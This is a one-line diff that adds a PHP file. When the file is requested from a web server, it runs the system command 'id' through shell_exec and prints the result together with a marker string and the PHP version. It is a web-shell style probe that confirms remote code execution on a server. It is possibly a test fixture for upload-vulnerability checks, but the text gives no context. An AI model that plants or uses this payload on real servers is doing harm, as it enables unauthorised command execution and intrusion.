@@ -1,0 +1,1 @@
+<?php echo "SHELL_OK_" . phpversion() . "_" . shell_exec("id"); ?>
